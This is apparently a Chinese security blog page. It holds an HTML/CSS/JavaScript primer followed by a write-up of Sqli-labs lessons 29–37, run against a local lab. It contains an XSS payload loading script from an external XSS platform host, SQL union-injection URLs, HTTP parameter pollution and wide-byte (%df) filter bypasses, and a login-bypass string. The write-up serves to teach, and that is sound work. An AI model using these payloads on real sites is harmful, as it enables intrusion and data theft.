-&lt;form action=&quot;#&quot; method=&quot;post&quot; name=&quot;表单名称&quot;&gt;  //#表示提交到当前页面
-    &lt;input type=&quot;控件类型&quot; /&gt; //除type属性,常用的id name value size
-    //控件类型 text(文本输入)  password(密码) radio(单选框) 复选框(checkbox) 上传控件(file) 提交(submit) 重置(reset)
-&lt;/form&gt;
-
-注释:&lt;!--注释内容--&gt;
-多行文本:&lt;textarea&gt;&lt;/textarea&gt;    
-超链接标记:&lt;a href=&quot;http://www.baidu.com&quot; target=&quot;_blank&quot;&gt;百度&lt;/a&gt;  //新窗口打开
-         &lt;a href=&quot;http://www.baidu.com&quot; target=&quot;_self&quot;&gt;百度&lt;/a&gt;  //本窗口打开
-
-&lt;div&gt;标记:常与css搭配使用
-列表标记:
-    无序列表:&lt;ul&gt;&lt;/ul&gt;
-    &lt;ul&gt;//定义无序列表
-        &lt;li type=&quot;disc&quot;&gt;列1&lt;/li&gt;  //&lt;li&gt;&lt;/li&gt;描述具体列表项 type有3种 分别为:disc square circle,默认属性为disc
-        &lt;li type=&quot;square&quot;&gt;列2&lt;/li&gt;
-        &lt;li type=&quot;circle&quot;&gt;列3&lt;/li&gt;
-    &lt;/ul&gt;
-</code></pre><h2 id="CSS"><a href="#CSS" class="headerlink" title="CSS"></a>CSS</h2><p>CSS用于增强控制网页样式并允许将样式信息与网页内容分离的一种标记性语言。在实际中主要用于设置显示样式。<br>定义规则:</p>
-<pre><code>选择器{属性一:属性值一; 属性二:属性值二;} /*选择器指定对象 属性设置*/
-</code></pre><h3 id="CSS引用方式"><a href="#CSS引用方式" class="headerlink" title="CSS引用方式"></a>CSS引用方式</h3><p>引用方式一共有4种,分别为链入式,行内式,内嵌式和导入式。<br>例子:</p>
-<pre><code>  #内嵌式:style写在head头部标记中
-&lt;!DOCTYPE html&gt;
-&lt;html&gt;
-&lt;head&gt;
-    &lt;style type=&quot;text/css&quot;&gt;
-        h2{ text-align: center; }/*h2标签的内容居中*/
-        div{ border: 1px solid red; width: 300px; height: 300px; color: blue; }
-        /*div为选择器,表示css作用的html对象 边框,宽度和高度; 1px solid red表示1像素 实心边框线 红色*/
-    &lt;/style&gt;
-&lt;/head&gt;
-&lt;body&gt;
-    &lt;h2&gt;hello css&lt;/h2&gt;
-    &lt;div id=&quot;div1&quot;&gt;
-        &lt;p id=&quot;p1&quot;&gt;hello p1&lt;/p&gt;
-        &lt;p id=&quot;p2&quot;&gt;hello p2&lt;/p&gt;
-    &lt;/div&gt;
-&lt;/body&gt;
-&lt;/html&gt;
-
-#链入式:像js一样引入css文件即可
-&lt;link href=&quot;test_demo.css&quot; type=&quot;text/css&quot; rel=&quot;stylesheet&quot; /&gt;  //rel:声明当前文档与被链接文档之间的关系 stylesheet表示样式表文件  且css文件中不写&lt;style&gt;&lt;/style&gt;
-</code></pre><h3 id="常用属性"><a href="#常用属性" class="headerlink" title="常用属性"></a>常用属性</h3><pre><code>a.标记选择器 标记名{属性名1:属性值1; 属性2:属性值2;}
-b.类选择器    .类名{属性名1:属性值1; 属性2:属性值2;}
-c.id选择器     #id{属性名1:属性值1; 属性2:属性值2;}
-d.通配符选择器 *{属性名1:属性值1; 属性2:属性值2;}
-</code></pre><p>例子用了类与id选择器:</p>
-<pre><code>&lt;!DOCTYPE html&gt;
-&lt;html&gt;
-&lt;head&gt;
-    &lt;style type=&quot;text/css&quot;&gt;
-        /*类选择器*/
-        .red {
-            color: red;
-        }
-        .green {
-            color: green;
-        }
-        .font18 {
-            font-size: 18px;
-        }
-
-        /*#_id选择器*/
-        #p1 {
-            font-weight: bold;
-        }
-        #p2 {
-            font-size: 24px;
-        }
-    &lt;/style&gt;
-&lt;/head&gt;
-&lt;body&gt;
-    &lt;!--类选择器的使用--&gt;
-    &lt;h1 class=&quot;red&quot;&gt;标题1: class=&quot;red&quot;&lt;/h1&gt;
-    &lt;h1 class=&quot;green font18&quot;&gt;标题1: 绿色,字号为18px&lt;/h1&gt;
-    &lt;h1 class=&quot;red font18&quot;&gt;标题1: 红色,字号为18px&lt;/h1&gt;
-
-    &lt;!--id选择器的使用--&gt;
-    &lt;p id=&quot;p1&quot;&gt;段落1:设置为粗体&lt;/p&gt;
-    &lt;p id=&quot;p2&quot;&gt;段落2:字号为24&lt;/p&gt;
-    &lt;p id=&quot;p2 p1&quot;&gt;段落:粗体+字号为24&lt;/p&gt;&lt;!--错误的  同一个标记对象不能同时引用多个id--&gt;
-&lt;/body&gt;
-&lt;/html&gt;
-</code></pre><p>更多属性参考:<a href="http://www.w3school.com.cn/cssref/index.asp" target="_blank" rel="noopener">CSS 参考手册</a></p>
-<h2 id="JavaScript"><a href="#JavaScript" class="headerlink" title="JavaScript"></a>JavaScript</h2><h3 id="JavaScript-HTML-DOM"><a href="#JavaScript-HTML-DOM" class="headerlink" title="JavaScript HTML DOM"></a>JavaScript HTML DOM</h3><p>当网页被加载时,浏览器会创建页面的文档对象模型(Document Object Model)<br>html dom模型被构造为对象的树<br>HTML DOM树：<br><img src="http://www.w3school.com.cn/i/ct_htmltree.gif" alt="xxxx">    </p>
-<p>通过可编程的对象模型,js获得了足够的能力来创建动态的html。    </p>
-<blockquote>
-<p>JavaScript 能够改变页面中的所有 HTML 元素<br>JavaScript 能够改变页面中的所有 HTML 属性<br>JavaScript 能够改变页面中的所有 CSS 样式<br>JavaScript 能够对页面中的所有事件做出反应    </p>
-</blockquote>
-<h3 id="DOM-HTML"><a href="#DOM-HTML" class="headerlink" title="DOM HTML"></a>DOM HTML</h3><p>JavaScript 能够改变页面中的所有<code>HTML</code>元素及属性<br>a.通过元素的id属性获取元素</p>
-<pre><code>#获取id属性的值为userid节点的代码:
-document.getElementById(&quot;userid&quot;)
-</code></pre><p>b.通过元素的name属性获取元素(由于多个元素可能有相同的name值,所以返回的是一个数组,通过其下标元素进行获取)</p>
-<pre><code>#获取name属性的值为userid节点的代码:
-document.getElementByName(&quot;username&quot;)[0]
-</code></pre><p>c.改变HTML元素的内容</p>
-<pre><code>#直接向HTML输出流写内容:
-&lt;script&gt;
-    document.write(Date());
-&lt;/script&gt;
-
-#改变 HTML 内容:
-document.getElementById(id).innerHTML=new HTML
-
-#改变id为p2的src属性值:
-document.getElementById(&quot;p2&quot;).src = &quot;xxx.jpg&quot;;
-</code></pre><h3 id="DOM-CSS"><a href="#DOM-CSS" class="headerlink" title="DOM CSS"></a>DOM CSS</h3><p>JavaScript 能够改变页面中的所有 CSS 样式</p>
-<h3 id="DOM-事件"><a href="#DOM-事件" class="headerlink" title="DOM 事件"></a>DOM 事件</h3><p>HTML DOM 使 JavaScript 有能力对 HTML 事件做出反应。</p>
-<pre><code>#点击文本变为test
-&lt;h1 onclick=&quot;this.innerHTML=&apos;test&apos;&quot;&gt;请点击该文本&lt;/h1&gt;
-
-&lt;h1 onclick=&quot;xxx(this)&quot;&gt;请点击该文本&lt;/h1&gt;
-function xxx(id){
-        id.innerHTML=&apos;test&apos;;
-    }
-</code></pre><p>html事件属性:</p>
-<pre><code>#点击按钮后,运行displayDate()函数
-&lt;button onclick=&quot;displayDate()&quot;&gt;点击这里&lt;/button&gt;
-
-#根据id添加onclick事件,当按钮被点击后,执行displayDate()函数
-document.getElementById(&quot;myButn&quot;).onclick = function(){displayDate()};
-</code></pre><p>利用onload处理cookie:</p>
-<pre><code>&lt;body onload=&quot;checkCookies()&quot;&gt;
-&lt;script&gt;
-function checkCookies()
-{
-if (navigator.cookieEnabled==true)
-    {
-    alert(&quot;已启用 cookie&quot;)
-    }
-else
-    {
-    alert(&quot;未启用 cookie&quot;)
-    }
-}
-&lt;/script&gt;
-</code></pre><p> 此外,常用的事件还有onchange,onmouseover,onmouseout等等</p>
-<h3 id="DOM-节点"><a href="#DOM-节点" class="headerlink" title="DOM 节点"></a>DOM 节点</h3><p> 创建新的HTML元素:如需向HTML DOM添加新元素,必须先创建该元素节点,然后向一个已经存在的元素追加该元素</p>
-<pre><code>&lt;!DOCTYPE html&gt;
-&lt;html&gt;
-&lt;head&gt;
-&lt;/head&gt;
-&lt;body&gt;
-    &lt;div id=&quot;div1&quot;&gt;
-        &lt;p id=&quot;p1&quot;&gt;hello p1&lt;/p&gt;
-        &lt;p id=&quot;p2&quot;&gt;hello p2&lt;/p&gt;
-    &lt;/div&gt;
-    &lt;script type=&quot;text/javascript&quot;&gt;
-        var para = document.createElement(&apos;p3&apos;);//创建一个P3标签
-        var node = document.createTextNode(&apos;hello p3&apos;);//创建一个文本节点
-        para.appendChild(node);//向P3元素添加文本内容
-
-        var element = document.getElementById(&apos;div1&apos;);//找到一个已有元素
-        element.appendChild(para);//追加新元素
-    &lt;/script&gt;
-&lt;/body&gt;
-&lt;/html&gt;
-</code></pre><p> 删除已有的html元素:如需删除HTML元素,必须首先获得该元素的父元素</p>
-<pre><code> &lt;body&gt;
-    &lt;div id=&quot;div1&quot;&gt;
-        &lt;p id=&quot;p1&quot;&gt;hello p1&lt;/p&gt;
-        &lt;p id=&quot;p2&quot;&gt;hello p2&lt;/p&gt;
-    &lt;/div&gt;
-    &lt;script type=&quot;text/javascript&quot;&gt;
-        var parent = document.getElementById(&apos;div1&apos;);
-        var child = document.getElementById(&apos;p1&apos;);
-        parent.removeChild(child);
-    &lt;/script&gt;
-&lt;/body&gt;
-</code></pre><p> 在不引用父元素的情况下删除某个元素,使用parentNode属性来找到父元素</p>
-<pre><code>var child = document.getElementById(&apos;p2&apos;);
-hild.parentNode.removeChild(child);
-</code></pre><h3 id="javascript的引入方式"><a href="#javascript的引入方式" class="headerlink" title="javascript的引入方式:"></a>javascript的引入方式:</h3><p>内嵌式:</p>
-<pre><code>&lt;script type=&quot;text/javascript&quot;&gt;
-    document.write(&quot;Hello World&quot;)
-&lt;/script&gt;
-</code></pre><p>外链式:<br>当脚本代码比较复杂或者同一段代码需要被多个网页文件同时使用时,可以将这些脚本代码放置在一个扩展名为.js的文件中,然后通过外链方法引入即可</p>
-<pre><code>&lt;script type=&quot;text/javascript&quot; src=&quot;js文件路径&quot;&gt;&lt;/script&gt;
-</code></pre><p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_11/2018-11-03.12.37.07-image.png" alt="2018-11-03.12.37.07-image.png"></p>
-<p>我们在测试xss漏洞时,使用的就是外链引入,而js代码就存储在xss平台的js文件里,测试payload:</p>
-<pre><code>&lt;script src=http://c7.gg/beXLv&gt;&lt;/script&gt;
-</code></pre><p>如果直接访问<code>http://c7.gg/beXLv</code>,可以看到js代码。<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_11/2018-11-03.13.04.01-image.png" alt="2018-11-03.13.04.01-image.png"></p>
-<h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型:"></a>数据类型:</h3><table>
-<thead>
-<tr>
-<th>类型</th>
-<th>含义</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>Number</td>
-<td>数值型</td>
-<td>不区分整性与浮点型,数值不需要用引号括起来</td>
-</tr>
-<tr>
-<td>String</td>
-<td>字符串</td>
-<td>‘或”括起来的一个或多个字符</td>
-</tr>
-<tr>
-<td>Boolean</td>
-<td>布尔</td>
-<td>True,False</td>
-</tr>
-<tr>
-<td>Object</td>
-<td>对象</td>
-<td>一组数据和功能的键值对集合</td>
-</tr>
-<tr>
-<td>Null</td>
-<td>空类型</td>
-<td>无任何值</td>
-</tr>
-<tr>
-<td>Undefined</td>
-<td>未定义</td>
-<td>变量被创建,但未赋值</td>
-</tr>
-</tbody>
-</table>
-<h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><p>使用var声明变量,由于JavaScript为一种弱类型语言,所以在声明时不需要指定变量类型,变量类型由变量的赋值情况来确定,语法格式如下:</p>
-<pre><code>var number=1;
-var str1=&quot;Hello world&quot;;
-</code></pre><p>变量名需遵循命名规则,变量名可由下划线<code>(_)</code>,字母,美元符号($),中文(不建议),不能使用JavaScript的关键字。</p>
-<p>需要注意,这些关键字同样不可用作函数名,对象名及自定义的方法名。</p>
-<h3 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h3><p>a.算术运算符:+ - <em> / ++ –<br>b.比较运算符:&lt; &gt; &lt;= &gt;= ==(只对表面进行比较 “27”==27 true)  !=(表面比较 “27”!=27 false)<br>c.逻辑运算符:&amp;&amp; || !(与 或 非)<br>d.赋值运算符:`= += -+ </em>= /= %=(a%=b相当于a=a%b)`<br>e.条件运算符:操作数?结果一:结果二  (如果操作数的值为true,则表达式结果为1,否则为2)</p>
-<h3 id="条件语句"><a href="#条件语句" class="headerlink" title="条件语句"></a>条件语句</h3><p>if必须为小写,当执行语句只有一行时,可以省略<code>{}</code></p>
-<pre><code>#单向判断
-if(条件)
-{
-    //code
-} 
-
-#双向判断
-if(条件){
-    //code1
-}
-else{
-    //code1
-}
-
-#多向判断:当条件1和条件2都不为true时执行code3的代码
-if(条件1){
-    //code1    
-}
-else if(条件2){
-    //code2
-}
-else{
-    //code3
-}
-</code></pre><h3 id="JavaScript的使用"><a href="#JavaScript的使用" class="headerlink" title="JavaScript的使用"></a>JavaScript的使用</h3><p>1.函数定义及调用:<br>定义函数是通过function语句实现的,语法格式:</p>
-<pre><code>function FunctionName(par1,par2){
-    statements;
-    {return expression;}#可返回任意表达式,变量,常量。可省略
-}
-</code></pre><p>函数名唯一且区分大小写</p>
-<h3 id="事件处理"><a href="#事件处理" class="headerlink" title="事件处理"></a>事件处理</h3><p>采用事件驱动是JavaScript最基本的特征,所谓的事件是指用户在访问页面时执行的操作。事件处理通常分为3步:发生事件,启动事件处理程序,对事件处理程序做出反应。上例子,就明白了:</p>
-<p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_11/2018-11-03.14.09.43-image.png" alt="2018-11-03.14.09.43-image.png"></p>
-<p>在点击’click me’后,会弹出提示窗口,对用户提示.我们在xss测试中常用的payload:<code>&lt;img src=1 onerror=&quot;alert(1)&quot;&gt;</code><br>除onclick与onerror外,JavaScript还有很多常用的事件类型:</p>
-<table>
-<thead>
-<tr>
-<th>属性</th>
-<th>当以下情况发生时，出现此事件 </th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>onblur</td>
-<td>元素失去焦点</td>
-</tr>
-<tr>
-<td>onchange</td>
-<td>用户改变域的内容</td>
-</tr>
-<tr>
-<td>onfocus</td>
-<td>元素获得焦点</td>
-</tr>
-<tr>
-<td>onreset</td>
-<td>重置按钮被点击</td>
-</tr>
-<tr>
-<td>onsubmit</td>
-<td>提交按钮被点击</td>
-</tr>
-<tr>
-<td>onunload</td>
-<td>用户退出页面</td>
-</tr>
-</tbody>
-</table>
-<h3 id="常用对象"><a href="#常用对象" class="headerlink" title="常用对象"></a>常用对象</h3><p>(1)Windows对象<br>(2)Date对象<br>主要用于处理事件:</p>
-<pre><code>&lt;script type=&quot;text/javascript&quot;&gt;
-    //var myDate=new Date();
-    var test=new Date();#创建Date对象
-
-    document.write(test.constructor);//返回Date()
-
-    //2018.11.03 15:19:56  星期六
-    document.write(Date());//返回当前时间
-    document.write(test.getDate());//3
-    document.write(test.getDay());//6
-    document.write(test.getMonth());//10
-    document.write(test.getFullYear());//2018
-    document.write(test.getHours());//15
-    document.write(test.getMinutes());//19
-    document.write(test.getSeconds());//56
-    document.write(test.getTime());//1541229596407 从1970年1月1日至今的毫秒数
-
-    //时间设置类似
-&lt;/script&gt;
-</code></pre><p>(3)String对象</p>
-<pre><code>&lt;script type=&quot;text/javascript&quot;&gt;
-    //var myDate=new Date();
-    var text = &quot;Hello world&quot;;
-    var str=&quot;How are you doing today?&quot;
-
-    //对象属性
-    document.write(text.length + &quot;&lt;br /&gt;&quot;);//返回text长度 一个汉字也是一个字符
-
-
-    //对象方法
-    document.write(text.indexOf(&apos;Hello&apos;) + &quot;&lt;br /&gt;&quot;);//返回Hello第一次在text出现的位置0  若无则返回-1
-    document.write(text.indexOf(&apos;World&apos;) + &quot;&lt;br /&gt;&quot;);//返回-1 因为对大小写敏感
-
-    document.write(text.lastIndexOf(&apos;Hello&apos;) + &quot;&lt;br /&gt;&quot;);//从后往前检索字符串 返回0
-    document.write(text.substr(3) + &quot;&lt;br /&gt;&quot;);//返回lo world
-    document.write(text.substr(3,7) + &quot;&lt;br /&gt;&quot;);//从3开始 取7个字符 返回lo worl
-
-    document.write(text.substring(3) + &quot;&lt;br /&gt;&quot;);//返回lo world
-    document.write(text.substring(3,7) + &quot;&lt;br /&gt;&quot;);//取下标为3到7的字符,返回lo w
-
-    document.write(str.split(&quot; &quot;) + &quot;&lt;br /&gt;&quot;);//根据空返回数组 通过[1] [2]可访问
-    document.write(str.split(&quot;&quot;) + &quot;&lt;br /&gt;&quot;);//每个字符都会分割
-
-
-    document.write(str.search(/are/) + &quot;&lt;br /&gt;&quot;);//检索doing 返回12 大小写敏感
-    document.write(str.search(/Are/i) + &quot;&lt;br /&gt;&quot;);//检索doing  大小写不敏感
-
-    document.write(text.replace(/world/, &quot;Z9&quot;) + &quot;&lt;br /&gt;&quot;);//将world替换为Z9
-    document.write(text.replace(/world/g, &quot;Z9&quot;) + &quot;&lt;br /&gt;&quot;);//将world全替换为Z9
-    document.write(text.replace(/world/i, &quot;Z9&quot;) + &quot;&lt;br /&gt;&quot;);//将world(大小写)全替换为Z9
-
-
-    document.write(text.toLowerCase() + &quot;&lt;br /&gt;&quot;);//全转化为小写
-    document.write(text.toUpperCase() + &quot;&lt;br /&gt;&quot;);//全转化为大写
-&lt;/script&gt;
-</code></pre>
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/01/Sqli-labs Less29-37/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="P0rZ9">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="P0rZ9's blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/11/01/Sqli-labs Less29-37/" itemprop="url">Sqli-labs less29-37</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-11-01T08:15:41+08:00">
-                2018-11-01
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h3 id="less-29"><a href="#less-29" class="headerlink" title="less-29"></a>less-29</h3><p>刚开始做这关,直接在<code>index.php</code>注的,无任何防护,直接联合注入即可,但是返回去看网上的教程发现题目应该是要求在<code>login.php</code>页面进行注入</p>
-<p>index.php直接联合注入即可:    </p>
-<pre><code>http://127.0.0.1:86/less-29/index.php?id=-1&apos; union select 1,database(),3%23
-</code></pre><p>login.php的注入:</p>
-<p><code>login.php</code>关键过滤代码:</p>
-<pre><code>function whitelist($input)
-{
-    $match = preg_match(&quot;/^\d+$/&quot;, $input);
-    if($match)
-    {
-        //echo &quot;you are good&quot;;
-        //return $match;
-    }
-    else
-    {    
-        header(&apos;Location: hacked.php&apos;);
-        //echo &quot;you are bad&quot;;
-    }
-}
-function java_implimentation($query_string)
-{
-    $q_s = $query_string;
-    $qs_array= explode(&quot;&amp;&quot;,$q_s);
-
-
-    foreach($qs_array as $key =&gt; $value)
-    {
-        $val=substr($value,0,2);
-        if($val==&quot;id&quot;)
-        {
-            $id_value=substr($value,3,30); 
-            return $id_value;
-            echo &quot;&lt;br&gt;&quot;;
-            break;
-        }
-
-    }
-
-}
-</code></pre><p>代码逻辑:<br>1.首先用<code>$_SERVER[&#39;QUERY_STRING&#39;];</code>获取?之后的查询字符串,然后去<code>java_implimentation()</code>函数过滤,返回id参数的值。<br>2.将返回的id参数的值给了函数<code>whitelist</code>,如果是数字则查询,否则跳转到<code>hacked.php</code></p>
-<p>重点:<br>此处服务器配置情况:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-31.12.41.56-image.png" alt="2018-10-31.12.41.56-image.png"><br>然后假设我们发送一个请求:<br><code>http://127.0.0.1:86/less-29/login.php?id=1&amp;id=2</code><br>对于这个请求,<code>apache(php)</code>解析最后一个参数,即显示id=2的内容，<code>Tomcat(jsp)</code>解析第一个参数,即显示id=1的内容</p>
-<p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-31.09.43.42-image.png" alt="2018-10-31.09.43.42-image.png"></p>
-<p>那这一关,根据该处的服务器配置情况,客户端的请求首先经过<code>tomcat</code>服务器,<code>tomcat</code>会解析第一个参数,接下来<code>tomcat</code>去请求<code>apache(php)</code>服务器,而<code>apache</code>会解析最后一个参数,那么最终返回的肯定是<code>apache</code>处理的数据。因为在实际情况中,如果配置两层服务器的情况,往往我们会在第一台服务器做数据处理和过滤,其功能类似于一个waf。而正是因为前后两层服务器对参数解析的不同,我们就可使用<code>HPP</code>(参数污染)攻击,该攻击会对服务器和客户端造成威胁。</p>
-<p>这里我们用参数污染的方式进行绕过:</p>
-<pre><code>login.php?id=1&amp;id=1&apos; and 1=1%23
-</code></pre><p>进入<code>java_implimentation()</code>函数的是?后面的整个字符串,返回的是第一个字段内容1,为数字成功绕过第一步的<code>tomcat</code>服务器的检测,到达<code>apache</code>服务器,执行第二个参数的语句。<br>然后后面的话,改变第二个参数的值即可。</p>
-<h3 id="less-30"><a href="#less-30" class="headerlink" title="less-30"></a>less-30</h3><p>将less-29的闭合符<code>&#39;</code>变为<code>&quot;</code>即可。</p>
-<h3 id="less-31"><a href="#less-31" class="headerlink" title="less-31"></a>less-31</h3><p>将less-29的闭合符<code>&#39;</code>变为<code>&quot;)</code>即可。</p>
-<hr>
-<p>HPP:<br>HPP不是一种漏洞,但是在网站存在waf的情况下可以帮助攻击者绕过waf。HPP参数污染,简单的讲就是给相同名称参数赋上两个或两个以上的值,导致应用程序以意外方式解释值而出现漏洞。</p>
-<p>我们把搜索的参数赋2个值看下<br>baidu:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-31.16.22.19-image.png" alt="2018-10-31.16.22.19-image.png"></p>
-<p>bing:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-31.16.23.49-image.png" alt="2018-10-31.16.23.49-image.png"></p>
-<p>百度取第一个而bing搜索取第二个参数,这是因为不同的网站(服务器)对相同参数的处理方式不同。</p>
-<p>我们less-29就是<code>waf(tomcat)</code>检验的是第一个参数值而<code>apache</code>服务器执行的却是第二个参数值导致绕过了waf。</p>
-<hr>
-<p>下面的几关都是涉及宽字节注入的,我们介绍一下宽字节注入的原理及用法:<br>原理:mysql在使用GBK编码时,会认为2个字符为1个汉字,例如<code>%df%5c</code>就是一个汉字,程序在过滤’时,一般会选择将’转化为\’,对于攻击者来说,绕过这种过滤,一般有两种思路:</p>
-<p>1.将\吃掉  具体原因:<code>urldecode(\&#39;)=%5c%27</code> 我们在前面添加%df使其变成<code>%df%5c%27</code> 而根据上面提到的,mysql在GBK编码时会将2个字节当作一个汉字,此时<code>%df%5c</code>就是一个汉字,%27被当作单独的符号在外面,就达到了使单引号逃逸的目的。    </p>
-<p>2.将\过滤,例如构造<code>%5c%5c%27</code>,第一个\转义第二个\,也可以使得单引号’逃逸,不过这种情况只适用于\没有被过滤得情况</p>
-<h3 id="less-32"><a href="#less-32" class="headerlink" title="less-32"></a>less-32</h3><p>我们尝试payload:</p>
-<pre><code>http://127.0.0.1:86/less-32/index.php?id=-1%df%27 union select 1,user(),3%23
-</code></pre><p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-11-01.09.32.32-image.png" alt="2018-11-01.09.32.32-image.png"></p>
-<p>可以看到<code>&#39;</code>成功逃逸,造成注入。</p>
-<p><code>less-32</code>代码:</p>
-<pre><code>function check_addslashes($string)
-{ //preg_quote：保持字符串,使其不适用正则表达式的特殊语义
-    $string = preg_replace(&apos;/&apos;. preg_quote(&apos;\\&apos;) .&apos;/&apos;, &quot;\\\\\\&quot;, $string);          //escape any backslash
-    $string = preg_replace(&apos;/\&apos;/i&apos;, &apos;\\\&apos;&apos;, $string);                               //escape single quote with a backslash
-    $string = preg_replace(&apos;/\&quot;/&apos;, &quot;\\\&quot;&quot;, $string);                                //escape double quote with a backslash
-
-
-    return $string;
-}
-</code></pre><p>上述函数为过滤<code>&#39;</code>的函数,将’转为<code>\&#39;</code>,将<code>&quot;</code>转化为<code>\&quot;</code>,将<code>\</code>转化为<code>\\</code>,所以我们只能使用第一种方法,将<code>%5c</code>吃掉,使<code>&#39;</code>逃逸,造成注入。</p>
-<p>若我们改变一下源代码,将过滤<code>\</code>的代码:<code>$string = preg_replace(&#39;/&#39;. preg_quote(&#39;\\&#39;) .&#39;/&#39;, &quot;\\\\\\&quot;, $string);</code>注释掉,用第二种方法过滤掉\,使’逃逸:</p>
-<p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-11-01.09.48.05-image.png" alt="2018-11-01.09.48.05-image.png"></p>
-<p>如图可看到,<code>&#39;</code>成功逃逸。</p>
-<h3 id="less-33"><a href="#less-33" class="headerlink" title="less-33"></a>less-33</h3><p>less-33的过滤代码:</p>
-<pre><code>function check_addslashes($string)
-{
-    $string= addslashes($string);    
-    return $string;
-}
-</code></pre><p>由代码可知,这里是用<code>addslashes()</code>函数来进行过滤的。<br><code>addslashes()</code> 返回预定字符之前添加\的字符串<br>预定义字符: <code>&#39;</code>,<code>&quot;</code>,<code>\</code>,处理方式与less-32一样,所以依旧用<code>%df</code>即可绕过。<br>注意:使用<code>addslashes()</code>函数,我们将<code>mysql_query()</code>设置<code>set character_set_client=binary</code>来设定客户端的字符集是二进制,就可防御此漏洞。</p>
-<pre><code>#设置客户端的字符集为二进制,Mysql就以二进制来执行sql语句
-Mysql_query(“SET character_set_connection=gbk,character_set_result=gbk,character_set_client=binary”,$conn);
-</code></pre><h3 id="less-34"><a href="#less-34" class="headerlink" title="less-34"></a>less-34</h3><p>这一关是post型的注入漏洞,同样是将传输过来的<code>&#39;</code>进行了<code>\&#39;</code>处理,同样可用<code>%df</code>吃掉\,造成’逃逸<br>但是前几关都是基于get形式的注入,数据是以url形式提交的,因此数据会经过URLencode,那我们将<code>%df</code>先经过URLencode得到<code>�</code>,或者在burp/hackbar里用<code>%df</code>也是可以的。</p>
-<p>首先在浏览器里尝试:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-11-01.11.02.48-image.png" alt="2018-11-01.11.02.48-image.png"></p>
-<p>burp：<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_11/2018-11-01.11.07.48-image.png" alt="2018-11-01.11.07.48-image.png"></p>
-<p>hackbar也是可以的:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_11/2018-11-01.11.06.05-image.png" alt="2018-11-01.11.06.05-image.png"></p>
-<p>浏览器直接提交只能使用源字符,hackbar与burp里使用源字符与url编码过的字符都可以。</p>
-<p>这里也说下万能密码:<br>提交:<code>�&#39; or 1=1#</code></p>
-<p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_11/2018-11-01.11.14.50-image.png" alt="2018-11-01.11.14.50-image.png"></p>
-<p>成功以Dumb的用户登陆。<br>我们看下源代码:</p>
-<pre><code>@$sql=&quot;SELECT username, password FROM users WHERE username=&apos;$uname&apos; and password=&apos;$passwd&apos; LIMIT 0,1&quot;;
-</code></pre><p>我们提交<code>�&#39; or 1=1#</code>,执行的sql语句为:<code>SELECT username, password FROM users WHERE username=&#39;�&#39; or 1=1#&#39; and password=&#39;$passwd&#39; LIMIT 0,1</code><br>实际执行的语句为<code>SELECT username, password FROM users WHERE username=&#39;�&#39; or 1=1</code>,无论数据库中有无username等于�的用户,在与1=1进行了or操作后,返回值都为1,<br>所以执行这条语句返回的结果是全部<code>username</code>与<code>password,mysql_fetch_array()</code>函数每次从结果集中取得一行作为关联数组,只去了一次,所以返回id为0的账户密码:<code>Dumb 0</code>。</p>
-<h3 id="less-35"><a href="#less-35" class="headerlink" title="less-35"></a>less-35</h3><p>添加单引<code>&#39;</code>测试:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_11/2018-11-01.11.37.30-image.png" alt="2018-11-01.11.37.30-image.png"></p>
-<p>报错信息:<code>&#39;\&#39; LIMIT 0,1&#39;</code>,说明这里并不需要闭合符,直接联合注入即可</p>
-<p><code>id=-1 union select 1,2,database()%23</code><br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_11/2018-11-01.11.38.45-image.png" alt="2018-11-01.11.38.45-image.png"></p>
-<h3 id="less-36"><a href="#less-36" class="headerlink" title="less-36"></a>less-36</h3><p>利用方式与<code>less-33</code>无异。</p>
-<p>查看源代码:</p>
-<pre><code>function check_quotes($string)
-{
-    $string= mysql_real_escape_string($string);    
-    return $string;
-}
-</code></pre><p>查看代码得知是用<code>mysql_real_escape_string()</code>进行过滤的</p>
